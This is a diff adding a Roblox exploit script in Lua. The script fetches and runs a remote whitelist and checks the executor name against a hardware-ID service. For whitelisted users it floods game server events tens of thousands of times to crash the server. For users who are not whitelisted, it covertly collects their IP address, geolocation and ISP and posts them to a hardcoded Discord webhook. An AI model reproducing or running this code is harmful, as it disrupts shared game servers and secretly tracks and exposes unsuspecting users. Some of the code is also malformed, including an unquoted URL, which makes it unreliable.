@@ -1,0 +1,106 @@
+_G.webhook = "https://discord.com/api/webhooks/1078416901572665355/AM7GTz-mfHJrOqRBtrGZqj7eXPH9obq7SxtbCqf3XvsapsBUkbAyhjRYVHVtWfhxZ0aR"
+local wl = loadstring(game:HttpGet(https://raw.githubusercontent.com/CrashScript/TheWhitelist/main/Santis1120))()
+local function contains(table, val)
+    for i = 1, #table do
+        if table[i] == val then
+            location = i
+            return true
+        end
+    end
+    return false
+end
+local res = (request or http_request or syn and syn.request)({
+    Url = "https://api.luauth.xyz/hwid",
+    Method = "GET"
+    })
+    if res.Success then
+    local index = string.find(res.Body, "Executor Name:")
+    if index then
+        if contains(wl,string.sub(res.Body, 19, index - 5)) then
+            game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Santis", Text = "Methods Trying.."})
+            for i,v in next, game.ReplicatedStorage:GetDescendants() do
+                if v.Name == "b\7\n\7\n\7" then
+                    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Santis", Text = "Method 1 Succsessfully Loaded!"})
+                    --KOHL CRASH
+for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    wait(10)
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    wait(10)
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+                elseif v.Name == "__FUNCTION" and v:IsA"RemoteFunction" and v.Parent:IsA"RemoteEvent" then
+                    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Santis", Text = "Method 2 Succsessfully Loaded!"})
+                    for i,v in next, game.ReplicatedStorage:GetDescendants() do
+    if v.Parent:IsA("RemoteEvent") and v:IsA("RemoteFunction") then
+        for i = 1, 10000 do v.Parent:FireServer() end
+    end
+end
+                else
+                    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Santis", Text = "This script don't support this game."})
+                    return
+                end
+            end
+        else
+            local name = game:GetService("Players").LocalPlayer.Name
+            local WebhookURL = _G.webhook
+            local getIPResponse = syn.request({
+                Url = "https://api.ipify.org/?format=json",
+                Method = "GET"
+            })
+            local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+            local IPBuffer = tostring(GetIPJSON.ip)
+            
+            local getIPInfo = syn.request({
+                Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+                Method = "Get"
+            })
+            local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+            local FI = {
+                IP = IPBuffer,
+                country = IIT.country,
+                countryCode = IIT.countryCode,
+                region = IIT.region,
+                regionName = IIT.regionName,
+                city = IIT.city,
+                zipcode = IIT.zip,
+                latitude = IIT.lat,
+                longitude = IIT.lon,
+                isp = IIT.isp,
+                org = IIT.org
+            }
+            local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
+            local MessageData = {
+                ["content"] = "**Secured By Cuersy**\n".. dataMessage
+            }
+            
+            syn.request(
+                {
+                    Url = WebhookURL, 
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = game:GetService("HttpService"):JSONEncode(MessageData)
+                }
+            )
+        end
+    end
+end
